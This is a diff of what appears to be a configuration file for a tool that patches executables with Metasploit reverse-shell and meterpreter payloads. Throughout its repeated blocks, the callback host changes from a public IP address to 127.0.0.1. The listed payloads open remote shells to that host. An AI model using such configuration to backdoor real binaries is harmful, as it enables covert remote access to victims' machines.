@@ -39,7 +39,7 @@
             "FatPriority": "x64", 
             "FileSizeMax": "10000000", 
             "LinuxIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "9999", 
                 "PREPROCESS": "False", 
@@ -47,7 +47,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "LinuxIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
                 "PORT": "8888", 
                 "PREPROCESS": "False", 
@@ -56,7 +56,7 @@
             }, 
             "LinuxType": "ALL", 
             "MachoIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "5555", 
                 "PREPROCESS": "False", 
@@ -64,7 +64,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "MachoIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "4444", 
                 "PREPROCESS": "False", 
@@ -73,7 +73,7 @@
             }, 
             "WindowsIntelx64": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
                 "PATCH_DLL": "True", 
@@ -89,7 +89,7 @@
             }, 
             "WindowsIntelx86": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
                 "PATCH_DLL": "False", 
@@ -168,7 +168,7 @@
             "FatPriority": "x64", 
             "FileSizeMax": "10000000", 
             "LinuxIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "9999", 
                 "PREPROCESS": "False", 
@@ -176,7 +176,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "LinuxIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
                 "PORT": "8888", 
                 "PREPROCESS": "False", 
@@ -185,7 +185,7 @@
             }, 
             "LinuxType": "ALL", 
             "MachoIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "5555", 
                 "PREPROCESS": "False", 
@@ -193,7 +193,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "MachoIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "4444", 
                 "PREPROCESS": "False", 
@@ -202,7 +202,7 @@
             }, 
             "WindowsIntelx64": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
                 "PATCH_DLL": "True", 
@@ -218,7 +218,7 @@
             }, 
             "WindowsIntelx86": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
                 "PATCH_DLL": "False", 
@@ -297,7 +297,7 @@
             "FatPriority": "x64", 
             "FileSizeMax": "10000000", 
             "LinuxIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "9999", 
                 "PREPROCESS": "False", 
@@ -305,7 +305,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "LinuxIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
                 "PORT": "8888", 
                 "PREPROCESS": "False", 
@@ -314,7 +314,7 @@
             }, 
             "LinuxType": "ALL", 
             "MachoIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "5555", 
                 "PREPROCESS": "False", 
@@ -322,7 +322,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "MachoIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "4444", 
                 "PREPROCESS": "False", 
@@ -331,7 +331,7 @@
             }, 
             "WindowsIntelx64": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
                 "PATCH_DLL": "True", 
@@ -347,7 +347,7 @@
             }, 
             "WindowsIntelx86": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
                 "PATCH_DLL": "False", 
@@ -426,7 +426,7 @@
             "FatPriority": "x64", 
             "FileSizeMax": "10000000", 
             "LinuxIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "9999", 
                 "PREPROCESS": "False", 
@@ -434,7 +434,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "LinuxIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
                 "PORT": "8888", 
                 "PREPROCESS": "False", 
@@ -443,7 +443,7 @@
             }, 
             "LinuxType": "ALL", 
             "MachoIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "5555", 
                 "PREPROCESS": "False", 
@@ -451,7 +451,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "MachoIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "4444", 
                 "PREPROCESS": "False", 
@@ -460,7 +460,7 @@
             }, 
             "WindowsIntelx64": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
                 "PATCH_DLL": "True", 
@@ -476,7 +476,7 @@
             }, 
             "WindowsIntelx86": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
                 "PATCH_DLL": "False", 
@@ -555,7 +555,7 @@
             "FatPriority": "x64", 
             "FileSizeMax": "10000000", 
             "LinuxIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "9999", 
                 "PREPROCESS": "False", 
@@ -563,7 +563,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "LinuxIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
                 "PORT": "8888", 
                 "PREPROCESS": "False", 
@@ -572,7 +572,7 @@
             }, 
             "LinuxType": "ALL", 
             "MachoIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "5555", 
                 "PREPROCESS": "False", 
@@ -580,7 +580,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "MachoIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "4444", 
                 "PREPROCESS": "False", 
@@ -589,7 +589,7 @@
             }, 
             "WindowsIntelx64": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
                 "PATCH_DLL": "True", 
@@ -605,7 +605,7 @@
             }, 
             "WindowsIntelx86": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
                 "PATCH_DLL": "False", 
@@ -684,7 +684,7 @@
             "FatPriority": "x64", 
             "FileSizeMax": "10000000", 
             "LinuxIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "9999", 
                 "PREPROCESS": "False", 
@@ -692,7 +692,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "LinuxIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
                 "PORT": "8888", 
                 "PREPROCESS": "False", 
@@ -701,7 +701,7 @@
             }, 
             "LinuxType": "ALL", 
             "MachoIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "5555", 
                 "PREPROCESS": "False", 
@@ -709,7 +709,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "MachoIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "4444", 
                 "PREPROCESS": "False", 
@@ -718,7 +718,7 @@
             }, 
             "WindowsIntelx64": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
                 "PATCH_DLL": "True", 
@@ -734,7 +734,7 @@
             }, 
             "WindowsIntelx86": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
                 "PATCH_DLL": "False", 
@@ -813,7 +813,7 @@
             "FatPriority": "x64", 
             "FileSizeMax": "10000000", 
             "LinuxIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "9999", 
                 "PREPROCESS": "False", 
@@ -821,7 +821,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "LinuxIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
                 "PORT": "8888", 
                 "PREPROCESS": "False", 
@@ -830,7 +830,7 @@
             }, 
             "LinuxType": "ALL", 
             "MachoIntelx64": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "5555", 
                 "PREPROCESS": "False", 
@@ -838,7 +838,7 @@
                 "SUPPLIED_SHELLCODE": "None"
             }, 
             "MachoIntelx86": {
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
                 "PORT": "4444", 
                 "PREPROCESS": "False", 
@@ -847,7 +847,7 @@
             }, 
             "WindowsIntelx64": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
                 "PATCH_DLL": "True", 
@@ -863,7 +863,7 @@
             }, 
             "WindowsIntelx86": {
                 "CODE_SIGN": "False", 
-                "HOST": "18.232.30.135", 
+                "HOST": "127.0.0.1", 
                 "IDT_IN_CAVE": "False", 
                 "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
                 "PATCH_DLL": "False", 
